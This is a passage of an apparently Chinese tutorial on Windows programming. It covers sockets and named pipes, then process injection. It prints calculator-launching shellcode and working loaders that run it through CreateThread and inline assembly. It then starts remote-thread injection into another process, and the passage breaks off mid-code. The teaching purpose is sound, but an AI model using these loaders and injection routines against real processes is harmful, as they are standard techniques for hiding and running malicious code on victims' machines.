flags\t// 设为0即可\n);\t\t\t\t\t// 成功返回实际接收大小 失败返回SOCKET_ERROR\n</code></pre>\n<p>　　接收方完整代码</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;WinSock2.h&gt;\n\n#pragma comment(lib, &quot;ws2_32.lib&quot;)\nint main()\n&#123;\n\n    WSADATA wsa;\n    int ret;\n    // 初始化socket\n    ret = WSAStartup(MAKEWORD(2, 2), &amp;wsa);\n    if (ret)\n    &#123;\n        printf(&quot;WSAStartup fail\\n&quot;);\n        return 0;\n    &#125;\n\n    // 创建socket\n    SOCKET sListen = socket(AF_INET, SOCK_STREAM, 0);\n    if (sListen == INVALID_SOCKET)\n    &#123;\n        printf(&quot;socket fail\\n&quot;);\n        return 0;\n    &#125;\n\n    // 监听端口\n    int port = 5899;\n    // 接收数据\n    SOCKADDR_IN local;\n    local.sin_family = AF_INET;\n    local.sin_port = htons(port);\n    // 接收任意ip数据\n    local.sin_addr.S_un.S_addr = htonl(INADDR_ANY);\n\n    // 绑定端口\n    ret = bind(sListen, (SOCKADDR*)&amp;local, sizeof(SOCKADDR));\n    if (ret == SOCKET_ERROR)\n    &#123;\n        printf(&quot;bind fail\\n&quot;);\n        return 0;\n    &#125;\n\n    // 监听端口\n    ret = listen(sListen, 5);\n    if (ret == SOCKET_ERROR)\n    &#123;\n        printf(&quot;listen fail\\n&quot;);\n        return 0;\n    &#125;\n\n    printf(&quot;Listening %d\\n&quot;, port);\n\n    // 建立连接\n    SOCKADDR_IN client;\n    int AddrSize = sizeof(SOCKADDR);\n    SOCKET sClient = accept(sListen, (SOCKADDR*)&amp;client, &amp;AddrSize);\n    if (sClient == INVALID_SOCKET)\n    &#123;\n        printf(&quot;accept fail\\n&quot;);\n        return 0;\n    &#125;\n\n    printf(&quot;connect from %s:%d\\n&quot;, inet_ntoa(client.sin_addr), ntohs(client.sin_port));\n\n    // 接收数据\n    char buffer[1024];\n    ZeroMemory(buffer, sizeof(buffer));\n\n    ret = recv(sClient, buffer, 1024, 0);\n    if (ret == 0 || ret == SOCKET_ERROR)\n    &#123;\n        printf(&quot;recv fail\\n&quot;);\n        return 0;\n    &#125;\n\n    printf(&quot;recv:%s\\n&quot;, buffer);\n    printf(&quot;recv:%d bytes&quot;, ret);\n\n    // 收尾\n    closesocket(sClient);\n    closesocket(sListen);\n    WSACleanup();\n&#125;\n</code></pre>\n<p>　　运行顺序是：先启动接收方，再启动发送方　　发送方结果</p>\n<pre><code class=\"none\">connect to 127.0.0.1:5899\nsending:hello\nsending:6 bytes\n</code></pre>\n<p>　　接收方结果</p>\n<pre><code class=\"none\">Listening 5899\nconnect from 127.0.0.1:8893\nrecv:hello\nrecv:6 bytes\n</code></pre>\n<h4 id=\"命名管道\"><a href=\"#命名管道\" class=\"headerlink\" title=\"命名管道\"></a>命名管道</h4><p>　　命名管道（Named Pipes），按照字面意思理解就是有名字的管道，它可在同一台计算机的不同进程之间或在跨越一个网络的不同计算机的不同进程之间，支持可靠的、单向或双向的数据通信。</p>\n<p>　　命名管道是由服务器端的进程建立的，管道的命名必须遵循特定的命名方法。 本地访问:<code>\\\\.\\pipe\\管道名</code>，远程访问:<code>\\\\ServerName\\pipe\\管道名</code>。客户端要想连接服务端，必须知道服务端的管道名称。</p>\n<h5 id=\"服务端\"><a href=\"#服务端\" class=\"headerlink\" title=\"服务端\"></a>服务端</h5><p>　　1.使用<code>CreateNamedPipe</code>来创建一个命名管道</p>\n<pre><code class=\"c\">HANDLE CreateNamedPipe(\n    LPCSTR                lpName,\t\t\t\t// 创建的管道名称\n    DWORD                 dwOpenMode,\t\t\t// 管道打开方式\n    DWORD                 dwPipeMode,\t\t\t// 管道模式\n    DWORD                 nMaxInstances,\t\t// 管道最大连接数 必须大于1小于255(PIPE_UNLIMITED_INSTANCES)\n    DWORD                 nOutBufferSize,\t\t// 管道输出缓冲区 0 使用默认大小\n    DWORD                 nInBufferSize,\t\t// 管道输入缓冲区 0 使用默认大小\n    DWORD                 nDefaultTimeOut,\t\t// 管道连接超时时间 0 默认超时50毫秒\n    LPSECURITY_ATTRIBUTES lpSecurityAttributes  // 指向SECURITY_ATTRIBUTES指针\n);\t\t\t\t\t\t\t\t\t\t\t\t// 成功返回服务端管道句柄 失败返回INVALID_HANDLE_VALUE\n</code></pre>\n<p><code>dwOpenMode</code></p>\n<pre><code>dwPipeMode\n</code></pre>\n<p><code>ConnectNamedPipe</code></p>\n<pre><code>ReadFile``WriteFile\nDisconnectNamedPipe``CreateNamedPipe\n</code></pre>\n<p>　　服务端 示例代码</p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n\nint main()\n&#123;\n    printf(&quot;waiting to connect\\n&quot;);\n\n    // 1.创建命名管道\n    HANDLE hPipe = CreateNamedPipe(\n        &quot;\\\\\\\\.\\\\pipe\\\\local&quot;,\n        PIPE_ACCESS_DUPLEX,\n        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,\n        PIPE_UNLIMITED_INSTANCES,\n        0, 0, 0, NULL\n    );\n\n    if (!hPipe)\n    &#123;\n        printf(&quot;CreateNamedPipe fail\\n&quot;);\n        return 0;\n    &#125;\n\n    // 2.等待客户端连接\n    if (!ConnectNamedPipe(hPipe, NULL))\n    &#123;\n        printf(&quot;ConnectNamedPipe fail\\n&quot;);\n        return 0;\n    &#125;\n\n    // 3.接收客户端数据\n    char buffer[256] = &#123; 0 &#125;;\n    ZeroMemory(buffer, sizeof(buffer));\n\n    if (!ReadFile(hPipe, buffer, sizeof(buffer), 0, NULL))\n    &#123;\n        printf(&quot;ReadFile fail\\n&quot;);\n        return 0;\n    &#125;\n\n    printf(&quot;recvData is %s&quot;, buffer);\n\n    // 4.向客户端发送数据\n    ZeroMemory(buffer, sizeof(buffer));\n    strcpy(buffer, &quot;hello Client&quot;);\n\n    if (!WriteFile(hPipe,buffer,sizeof(buffer),0,NULL))\n    &#123;\n        printf(&quot;WriteFile fail\\n&quot;);\n        return 0;\n    &#125;\n\n    // 断开连接\n    DisconnectNamedPipe(hPipe);\n    CloseHandle(hPipe);\n    return 0;\n&#125;\n</code></pre>\n<h5 id=\"客户端\"><a href=\"#客户端\" class=\"headerlink\" title=\"客户端\"></a>客户端</h5><p>　　1.客户端使用<code>WaitNamedPipe</code>来等待管道的出现</p>\n<pre><code class=\"c\">BOOL WaitNamedPipe(\n    LPCSTR lpNamedPipeName, // 命名管道名称\n    DWORD  nTimeOut\t\t\t// 超时时间 单位毫秒\n);\t\t\t\t\t\t\t// 成功返回非0 失败返回0\n</code></pre>\n<p><code>nTimeOut</code></p>\n<p><code>CreateFile``WriteFile``ReadFile</code></p>\n<pre><code class=\"c\">#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n&#123;\n    // 1.等待管道出现\n    if (!WaitNamedPipe(&quot;\\\\\\\\.\\\\pipe\\\\local&quot;, NMPWAIT_WAIT_FOREVER))\n    &#123;\n        printf(&quot;WaitNamedPipe fail\\n&quot;);\n        return 0;\n    &#125;\n\n    printf(&quot;connect namePipe success\\n&quot;);\n\n    // 2.打开命名管道句柄\n    HANDLE hPipe = CreateFile(&quot;\\\\\\\\.\\\\pipe\\\\local&quot;, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (!hPipe)\n    &#123;\n        printf(&quot;CreateFile fail\\n&quot;);\n        return 0;\n    &#125;\n\n    // 3.向服务端发送数据\n    char buffer[256] = &quot;hello Server&quot;;\n\n    if (!WriteFile(hPipe, buffer, sizeof(buffer), 0, NULL))\n    &#123;\n        printf(&quot;WriteFile fail\\n&quot;);\n        return 0;\n    &#125;\n\n\n    // 4.从服务端接收数据\n    ZeroMemory(buffer, sizeof(buffer));\n    if (!ReadFile(hPipe, buffer, sizeof(buffer), 0, NULL))\n    &#123;\n        printf(&quot;ReadFile fail\\n&quot;);\n        return 0;\n    &#125;\n\n    printf(&quot;recvData is %s\\n&quot;, buffer);\n    CloseHandle(hPipe);\n    return 0;\n&#125;\n</code></pre>\n<p>　　运行结果</p>\n<pre><code class=\"none\">服务端\nwaiting to connect\nrecvData is hello Server\n\n客户端\nconnect namePipe success\nrecvData is hello Client\n</code></pre>\n<h3 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h3><h4 id=\"什么是注入\"><a href=\"#什么是注入\" class=\"headerlink\" title=\"什么是注入\"></a>什么是注入</h4><p>　　所谓注入就是在第三方进程不知道或者不允许的情况下讲模块或者代码写入对方进程空间，并设法执行的技术。<br>　　在安全领域，”注入”是非常重要的一种技术手段，注入与反注入也一直不断变化的。<br>　　已知的注入方式:远程线程注入、APC注入、消息钩子注入、注册表注入、导入表注入、输入法注入等等。</p>\n<h4 id=\"执行shellcode\"><a href=\"#执行shellcode\" class=\"headerlink\" title=\"执行shellcode\"></a>执行shellcode</h4><p>　　什么是shellcode，通俗来讲shellcode就是代码，一般来说是恶意代码。shellcode为16进制的机器码。以下shellcode的作用就是执行计算器</p>\n<pre><code class=\"none\">\\x55\\x64\\x8B\\x35\\x30\\x00\\x00\\x00\\x8B\\x76\\x0C\\x8B\\x76\\x1C\\x8B\\x6E\\x08\\x8B\\x7E\\x20\\x8B\\x36\\x38\\x4F\\x18\\x75\\xF3\\x8B\\xFD\\x83\\xEC\\x64\\x8B\\xEC\\x8B\\x47\\x3C\\x8B\\x54\\x07\\x78\\x03\\xD7\\x8B\\x4A\\x18\\x8B\\x5A\\x20\\x03\\xDF\\x49\\x8B\\x34\\x8B\\x03\\xF7\\xB8\\x47\\x65\\x74\\x50\\x39\\x06\\x75\\xF1\\xB8\\x72\\x6F\\x63\\x41\\x39\\x46\\x04\\x75\\xE7\\x8B\\x5A\\x24\\x03\\xDF\\x66\\x8B\\x0C\\x4B\\x8B\\x5A\\x1C\\x03\\xDF\\x8B\\x04\\x8B\\x03\\xC7\\x89\\x45\\x4C\\x6A\\x00\\x68\\x61\\x72\\x79\\x41\\x68\\x4C\\x69\\x62\\x72\\x68\\x4C\\x6F\\x61\\x64\\x54\\x57\\xFF\\x55\\x4C\\x89\\x45\\x50\\x6A\\x00\\x68\\x65\\x73\\x73\\x00\\x68\\x50\\x72\\x6F\\x63\\x68\\x45\\x78\\x69\\x74\\x54\\x57\\xFF\\x55\\x4C\\x89\\x45\\x54\\x6A\\x00\\x68\\x72\\x74\\x00\\x00\\x68\\x6D\\x73\\x76\\x63\\x54\\xFF\\x55\\x50\\x8B\\xF8\\x6A\\x00\\x68\\x65\\x6D\\x00\\x00\\x68\\x73\\x79\\x73\\x74\\x54\\x57\\xFF\\x55\\x4C\\x89\\x45\\x5C\\x6A\\x00\\x68\\x63\\x61\\x6C\\x63\\x54\\xFF\\x55\\x5C\\xFF\\x55\\x54\\xC3\\xCC\n</code></pre>\n<h5 id=\"CreateThread\"><a href=\"#CreateThread\" class=\"headerlink\" title=\"CreateThread\"></a>CreateThread</h5><p>　　流程: 首先开辟一段内存，然后shellcode放进该内存中，最后执行这段shellcode</p>\n<p>　　<strong>开辟内存</strong></p>\n<pre><code class=\"c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\nint main()\n&#123;\n    // 执行计算器的shellcode\n    unsigned char shellcode[] =\n        &quot;\\x55\\x64\\x8B\\x35\\x30\\x00\\x00\\x00\\x8B\\x76\\x0C\\x8B\\x76&quot;\n        &quot;\\x1C\\x8B\\x6E\\x08\\x8B\\x7E\\x20\\x8B\\x36\\x38\\x4F\\x18\\x75&quot;\n        &quot;\\xF3\\x8B\\xFD\\x83\\xEC\\x64\\x8B\\xEC\\x8B\\x47\\x3C\\x8B\\x54&quot;\n        &quot;\\x07\\x78\\x03\\xD7\\x8B\\x4A\\x18\\x8B\\x5A\\x20\\x03\\xDF\\x49&quot;\n        &quot;\\x8B\\x34\\x8B\\x03\\xF7\\xB8\\x47\\x65\\x74\\x50\\x39\\x06\\x75&quot;\n        &quot;\\xF1\\xB8\\x72\\x6F\\x63\\x41\\x39\\x46\\x04\\x75\\xE7\\x8B\\x5A&quot;\n        &quot;\\x24\\x03\\xDF\\x66\\x8B\\x0C\\x4B\\x8B\\x5A\\x1C\\x03\\xDF\\x8B&quot;\n        &quot;\\x04\\x8B\\x03\\xC7\\x89\\x45\\x4C\\x6A\\x00\\x68\\x61\\x72\\x79&quot;\n        &quot;\\x41\\x68\\x4C\\x69\\x62\\x72\\x68\\x4C\\x6F\\x61\\x64\\x54\\x57&quot;\n        &quot;\\xFF\\x55\\x4C\\x89\\x45\\x50\\x6A\\x00\\x68\\x65\\x73\\x73\\x00&quot;\n        &quot;\\x68\\x50\\x72\\x6F\\x63\\x68\\x45\\x78\\x69\\x74\\x54\\x57\\xFF&quot;\n        &quot;\\x55\\x4C\\x89\\x45\\x54\\x6A\\x00\\x68\\x72\\x74\\x00\\x00\\x68&quot;\n        &quot;\\x6D\\x73\\x76\\x63\\x54\\xFF\\x55\\x50\\x8B\\xF8\\x6A\\x00\\x68&quot;\n        &quot;\\x65\\x6D\\x00\\x00\\x68\\x73\\x79\\x73\\x74\\x54\\x57\\xFF\\x55&quot;\n        &quot;\\x4C\\x89\\x45\\x5C\\x6A\\x00\\x68\\x63\\x61\\x6C\\x63\\x54\\xFF&quot;\n        &quot;\\x55\\x5C\\xFF\\x55\\x54\\xC3\\xCC&quot;;\n\n    // 获取大小\n    int size = sizeof(shellcode);\n\n    LPVOID lpAddress = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    if (lpAddress)\n    &#123;\n        printf(&quot;address:%p\\n&quot;, lpAddress);\n    &#125;\n    getchar();\n&#125;\n</code></pre>\n<p>　　得到开辟的地址为:00030000<br>　<br>　　使用<a href=\"https://x64dbg.com/\">x32dbg</a> 选择附加<br>　<br>　　将demo附加进去<br>　<br>　　在内存1窗口中 <code>右键-&gt;转到-&gt;表达式</code><br>　<br>　　输入前面开辟的地址:00030000<br>　<br>　　从内存中可看到开辟了空间，内容都是空<br>　<br>　　<strong>复制shellcode</strong></p>\n<pre><code class=\"c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\nint main()\n&#123;\n    // 执行计算器的shellcode\n    unsigned char shellcode[] =\n        &quot;\\x55\\x64\\x8B\\x35\\x30\\x00\\x00\\x00\\x8B\\x76\\x0C\\x8B\\x76&quot;\n        &quot;\\x1C\\x8B\\x6E\\x08\\x8B\\x7E\\x20\\x8B\\x36\\x38\\x4F\\x18\\x75&quot;\n        &quot;\\xF3\\x8B\\xFD\\x83\\xEC\\x64\\x8B\\xEC\\x8B\\x47\\x3C\\x8B\\x54&quot;\n        &quot;\\x07\\x78\\x03\\xD7\\x8B\\x4A\\x18\\x8B\\x5A\\x20\\x03\\xDF\\x49&quot;\n        &quot;\\x8B\\x34\\x8B\\x03\\xF7\\xB8\\x47\\x65\\x74\\x50\\x39\\x06\\x75&quot;\n        &quot;\\xF1\\xB8\\x72\\x6F\\x63\\x41\\x39\\x46\\x04\\x75\\xE7\\x8B\\x5A&quot;\n        &quot;\\x24\\x03\\xDF\\x66\\x8B\\x0C\\x4B\\x8B\\x5A\\x1C\\x03\\xDF\\x8B&quot;\n        &quot;\\x04\\x8B\\x03\\xC7\\x89\\x45\\x4C\\x6A\\x00\\x68\\x61\\x72\\x79&quot;\n        &quot;\\x41\\x68\\x4C\\x69\\x62\\x72\\x68\\x4C\\x6F\\x61\\x64\\x54\\x57&quot;\n        &quot;\\xFF\\x55\\x4C\\x89\\x45\\x50\\x6A\\x00\\x68\\x65\\x73\\x73\\x00&quot;\n        &quot;\\x68\\x50\\x72\\x6F\\x63\\x68\\x45\\x78\\x69\\x74\\x54\\x57\\xFF&quot;\n        &quot;\\x55\\x4C\\x89\\x45\\x54\\x6A\\x00\\x68\\x72\\x74\\x00\\x00\\x68&quot;\n        &quot;\\x6D\\x73\\x76\\x63\\x54\\xFF\\x55\\x50\\x8B\\xF8\\x6A\\x00\\x68&quot;\n        &quot;\\x65\\x6D\\x00\\x00\\x68\\x73\\x79\\x73\\x74\\x54\\x57\\xFF\\x55&quot;\n        &quot;\\x4C\\x89\\x45\\x5C\\x6A\\x00\\x68\\x63\\x61\\x6C\\x63\\x54\\xFF&quot;\n        &quot;\\x55\\x5C\\xFF\\x55\\x54\\xC3\\xCC&quot;;\n\n    // 获取大小\n    int size = sizeof(shellcode);\n\n    LPVOID lpAddress = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    if (lpAddress)\n    &#123;\n        printf(&quot;address:%p\\n&quot;, lpAddress);\n\n        // 拷贝shellcode\n        memcpy(lpAddress,shellcode,size);\n    &#125;\n    getchar();\n&#125;\n</code></pre>\n<p>　　运行后，再次查看内存空间，成功将shellcode写入<br>　<br>　　线程是附属在进程上的执行实体，是代码的执行流程；代码必须通过线程才能执行。这里使用前面学过的创建线程:CreateThread来运行shellcode</p>\n<p>　　<strong>运行shellcode</strong></p>\n<pre><code class=\"c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\nint main()\n&#123;\n    // 执行计算器的shellcode\n    unsigned char shellcode[] =\n        &quot;\\x55\\x64\\x8B\\x35\\x30\\x00\\x00\\x00\\x8B\\x76\\x0C\\x8B\\x76&quot;\n        &quot;\\x1C\\x8B\\x6E\\x08\\x8B\\x7E\\x20\\x8B\\x36\\x38\\x4F\\x18\\x75&quot;\n        &quot;\\xF3\\x8B\\xFD\\x83\\xEC\\x64\\x8B\\xEC\\x8B\\x47\\x3C\\x8B\\x54&quot;\n        &quot;\\x07\\x78\\x03\\xD7\\x8B\\x4A\\x18\\x8B\\x5A\\x20\\x03\\xDF\\x49&quot;\n        &quot;\\x8B\\x34\\x8B\\x03\\xF7\\xB8\\x47\\x65\\x74\\x50\\x39\\x06\\x75&quot;\n        &quot;\\xF1\\xB8\\x72\\x6F\\x63\\x41\\x39\\x46\\x04\\x75\\xE7\\x8B\\x5A&quot;\n        &quot;\\x24\\x03\\xDF\\x66\\x8B\\x0C\\x4B\\x8B\\x5A\\x1C\\x03\\xDF\\x8B&quot;\n        &quot;\\x04\\x8B\\x03\\xC7\\x89\\x45\\x4C\\x6A\\x00\\x68\\x61\\x72\\x79&quot;\n        &quot;\\x41\\x68\\x4C\\x69\\x62\\x72\\x68\\x4C\\x6F\\x61\\x64\\x54\\x57&quot;\n        &quot;\\xFF\\x55\\x4C\\x89\\x45\\x50\\x6A\\x00\\x68\\x65\\x73\\x73\\x00&quot;\n        &quot;\\x68\\x50\\x72\\x6F\\x63\\x68\\x45\\x78\\x69\\x74\\x54\\x57\\xFF&quot;\n        &quot;\\x55\\x4C\\x89\\x45\\x54\\x6A\\x00\\x68\\x72\\x74\\x00\\x00\\x68&quot;\n        &quot;\\x6D\\x73\\x76\\x63\\x54\\xFF\\x55\\x50\\x8B\\xF8\\x6A\\x00\\x68&quot;\n        &quot;\\x65\\x6D\\x00\\x00\\x68\\x73\\x79\\x73\\x74\\x54\\x57\\xFF\\x55&quot;\n        &quot;\\x4C\\x89\\x45\\x5C\\x6A\\x00\\x68\\x63\\x61\\x6C\\x63\\x54\\xFF&quot;\n        &quot;\\x55\\x5C\\xFF\\x55\\x54\\xC3\\xCC&quot;;\n\n    // 获取大小\n    int size = sizeof(shellcode);\n\n    // 1.开辟内存空间\n    LPVOID lpAddress = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    if (lpAddress)\n    &#123;\n        printf(&quot;address:%p\\n&quot;, lpAddress);\n\n        // 2.复制shellcode\n        CopyMemory(lpAddress, shellcode, size);\n\n        // 3.执行shellcode\n        HANDLE hThread = CreateThread(NULL, 0, lpAddress, NULL, 0, NULL);\n        if (hThread)\n        &#123;\n            printf(&quot;exec shellcode&quot;);\n            // 等待线程执行完毕 ps:这会导致主线程死锁\n            WaitForSingleObject(hThread, INFINITE);\n        &#125;\n        \n        // 另外一种执行shellcode写法\n        // (*(void (*)())lpAddress)();\n    &#125;\n&#125;\n</code></pre>\n<p>上面的shellcode在各个电脑上并非通用，实验目的让大家更好的理解各函数的工作过程与原理。　　</p>\n<p>这是最常见的一种，介绍加载shellcode的其他方法</p>\n<h5 id=\"内嵌汇编\"><a href=\"#内嵌汇编\" class=\"headerlink\" title=\"内嵌汇编\"></a>内嵌汇编</h5><pre><code class=\"c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker, &quot;/section:.data,RWE&quot;)\nunsigned char shellcode[] =&quot;&quot;;\n\nvoid main()\n&#123;\n        __asm\n    &#123;\n        \n        mov eax, offset shellcode\n        jmp eax\n\n    &#125;\n&#125;\n</code></pre>\n<h5 id=\"伪指令\"><a href=\"#伪指令\" class=\"headerlink\" title=\"伪指令\"></a>伪指令</h5><pre><code class=\"c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker, &quot;/section:.data,RWE&quot;)\nunsigned char shellcode[] =&quot;&quot;;\n\nvoid main()\n&#123;\n        __asm\n    &#123;\n        \n        mov eax, offset shellcode\n        _emit 0xFF  \n        _emit 0xE0\n\n    &#125;\n&#125;\n</code></pre>\n<h5 id=\"text段\"><a href=\"#text段\" class=\"headerlink\" title=\".text段\"></a>.text段</h5><pre><code class=\"c\">#pragma section(&quot;.text&quot;)\n\n__declspec(allocate(&quot;.text&quot;)) char goodcode[] = &quot;&quot;;\n\nint main()\n&#123;\n    (*(void(*)())(&amp;goodcode))();\n&#125;\n</code></pre>\n<h4 id=\"远程线程注入\"><a href=\"#远程线程注入\" class=\"headerlink\" title=\"远程线程注入\"></a>远程线程注入</h4><p>　　现在我们要让shellcode注入进其他进程。</p>\n<p>　　创建远程线程的方法我找到的有三种：1.CreateRemoteThread；2.NtCreateThreadEx；3.RtlCreateUserThread。</p>\n<h5 id=\"CreateRemoteThread\"><a href=\"#CreateRemoteThread\" class=\"headerlink\" title=\"CreateRemoteThread\"></a>CreateRemoteThread</h5><p>　　这里要注入的进程命名成A.exe，代码如下</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\nint main()\n&#123;\n    printf(&quot;hello world&quot;);\n    getchar();\n&#125;\n</code></pre>\n<p>　　B.exe代码如下 </p>\n<p>　　<strong>开辟内存</strong></p>\n<pre><code class=\"c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;TlHelp32.h&gt;\n\n// 获取PID\nDWORD GetPid(char *name)\n&#123;\n    // 创建进程快照\n    HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\n    // 句柄无效\n    if (hProcess == INVALID_HANDLE_VALUE)\n    &#123;\n        return -1;\n    &#125;\n\n    // 快照信息结构体\n    PROCESSENTRY32 pe;\n    ZeroMemory(&amp;pe, sizeof(pe));\n    pe.dwSize = sizeof(pe);\n\n    BOOL flag = Process32First(hProcess, &amp;pe);\n    while (flag)\n    &#123;\n        // 已成功找到进程\n        if (strcmp(pe.szExeFile, name) == 0)\n        &#123;\n            // 返回对应PID\n            return pe.th32ProcessID;\n        &#125;\n        flag = Process32Next(hProcess, &amp;pe);\n    &#125;\n\n    CloseHandle(hProcess);\n\n    return -1;\n&#125;\n\nint main()\n&#123;\n    // 执行计算器的shellcode\n    unsigned char shellcode[] =\n        &quot;\\x55\\x64\\x8B\\x35\\x30\\x00\\x00\\x00\\x8B\\x76\\x0C\\x8B\\x76&quot;\n        &quot;\\x1C\\x8B\\x6E\\x08\\x8B\\x7E\\x20\\x8B\\x36\\x38\\x4F\\x18\\x75&quot;\n        &quot;\\xF3\\x8B\\xFD\\x83\\xEC\\x64\\x8B\\xEC\\x8B\\x47\\x3C\\x8B\\x54&quot;\n        &quot;\\x07\\x78\\x03\\xD7\\x8B\\x4A\\x18\\x8B\\x5A\\x20\\x03\\xDF\\x49&quot;\n        &quot;\\x8B\\x34\\x8B\\x03\\xF7\\xB8\\x47\\x65\\x74\\x50\\x39\\x06\\x75&quot;\n        &quot;\\xF1\\xB8\\x72\\x6F\\x63\\x41\\x39\\x46\\x04\\x75\\xE7\\x8B\\x5A&quot;\n        &quot;\\x24\\x03\\xDF\\x66\\x8B\\x0C\\x4B\\x8B\\x5A\\x1C\\x03\\xDF\\x8B&quot;\n        &quot;\\x04\\x8B\\x03\\xC7\\x89\\x45\\x4C\\x6A\\x00\\x68\\x61\\x72\\x79&quot;\n        &quot;\\x41\\x68\\x4C\\x69\\x62\\x72\\x68\\x4C\\x6F\\x61\\x64\\x54\\x57&quot;\n        &quot;\\xFF\\x55\\x4C\\x89\\x45\\x50\\x6A\\x00\\x68\\x65\\x73\\x73\\x00&quot;\n        &quot;\\x68\\x50\\x72\\x6F\\x63\\x68\\x45\\x78\\x69\\x74\\x54\\x57\\xFF&quot;\n        &quot;\\x55\\x4C\\x89\\x45\\x54\\x6A\\x00\\x68\\x72\\x74\\x00\\x00\\x68&quot;\n        &quot;\\x6D\\x73\\x76\\x63\\x54\\xFF\\x55\\x50\\x8B\\xF8\\x6A\\x00\\x68&quot;\n        &quot;\\x65\\x6D\\x00\\x00\\x68\\x73\\x79\\x73\\x74\\x54\\x57\\xFF\\x55&quot;\n        &quot;\\x4C\\x89\\x45\\x5C\\x6A\\x00\\x68\\x63\\x61\\x6C\\x63\\x54\\xFF&quot;\n        &quot;\\x55\\x5C\\xFF\\x55\\x54\\xC3\\xCC&quot;;\n\n    // 获取大小\n    int size = sizeof(shellcode);\n\n    // 获取A.exe的PID\n    DWORD dwProcessId = GetPid(&quot;A.exe&quot;);\n\n    // 1.打开进程\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);\n\n    if (hProcess)\n    &#123;\n        // 2.开辟内存空间 VirtualAllocEx 指定进程开辟内存\n        LPVOID lpAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n        if (lpAddress)\n        &#123;\n            printf(&quot;address:%p\\n&quot;, lpAddress);\n        &#125;\n    &#125;\n&#125;\n\n\n　　使用**WriteProcessMemory**将shellcode写入指定进程中的内存区域\n</code></pre>\n<pre><code class=\"c\">BOOL WriteProcessMemory(\n    HANDLE  hProcess,\t\t\t\t\t// 进程句柄\n    LPVOID  lpBaseAddress,\t\t\t\t// 写入内存首地址\n    LPCVOID lpBuffer,\t\t\t\t\t// 写入内容\n    SIZE_T  nSize,\t\t\t\t\t\t// 写入大小\n    SIZE_T  *lpNumberOfBytesWritten\t\t// 设置成NULL即可\n);\t\t\t\t\t\t\t\t\t\t// 成功返回非0 失败返回0\n</code></pre>\n<p>　　写入shellcode</p>\n<pre><code class=\"c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;TlHelp32.h&gt;\n\n// 获取PID\nDWORD GetPid(char *name)\n&#123;\n    // 创建进程快照\n    HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\n    // 句柄无效\n    if (hProcess == INVALID_HANDLE_VALUE)\n    &#123;\n        return -1;\n    &#125;\n\n    // 快照信息结构体\n    PROCESSENTRY32 pe;\n    ZeroMemory(&amp;pe, sizeof(pe));\n    pe.dwSize = sizeof(pe);\n\n    BOOL flag = Process32First(hProcess, &amp;pe);\n    while (flag)\n    &#123;\n        // 已成功找到进程\n        if (strcmp(pe.szExeFile, name) == 0)\n        &#123;\n            // 返回对应PID\n            return pe.th32ProcessID;\n        &#125;\n        flag = Process32Next(hProcess, &amp;pe);\n    &#125;\n\n    CloseHandle(hProcess);\n\n    return -1;\n&#125;\n\nint main()\n&#123;\n    // 执行计算器的shellcode\n    unsigned char shellcode[] =\n        &quot;\\x55\\x64\\x8B\\x35\\x30\\x00\\x00\\x00\\x8B\\x76\\x0C\\x8B\\x76&quot;\n        &quot;\\x1C\\x8B\\x6E\\x08\\x8B\\x7E\\x20\\x8B\\x36\\x38\\x4F\\x18\\x75&quot;\n        &quot;\\xF3\\x8B\\xFD\\x83\\xEC\\x64\\x8B\\xEC\\x8B\\x47\\x3C\\x8B\\x54&quot;\n        &quot;\\x07\\x78\\x03\\xD7\\x8B\\x4A\\x18\\x8B\\x5A\\x20\\x03\\xDF\\x49&quot;\n        &quot;\\x8B\\x34\\x8B\\x03\\xF7\\xB8\\x47\\x65\\x74\\x50\\x39\\x06\\x75&quot;\n        &quot;\\xF1\\xB8\\x72\\x6F\\x63\\x41\\x39\\x46\\x04\\x75\\xE7\\x8B\\x5A&quot;\n        &quot;\\x24\\x03\\xDF\\x66\\x8B\\x0C\\x4B\\x8B\\x5A\\x1C\\x03\\xDF\\x8B&quot;\n        &quot;\\x04\\x8B\\x03\\xC7\\x89\\x45\\x4C\\x6A\\x00\\x68\\x61\\x72\\x79&quot;\n        &quot;\\x41\\x68\\x4C\\x69\\x62\\x72\\x68\\x4C\\x6F\\x61\\x64\\x54\\x57&quot;\n        &quot;\\xFF\\x55\\x4C\\x89\\x45\\x50\\x6A\\x00\\x68\\x65\\x73\\x73\\x00&quot;\n        &quot;\\x68\\x50\\x72\\x6F\\x63\\x68\\x45\\x78\\x69\\x74\\x54\\x57\\xFF&quot;\n        &quot;\\x55\\x4C\\x89\\x45\\x54\\x6A\\x00\\x68\\x72\\x74\\x00\\x00\\x68&quot;\n        &quot;\\x6D\\x73\\x76\\x63\\x54\\xFF\\x55\\x50\\x8B\\xF8\\x6A\\x00\\x68&quot;\n        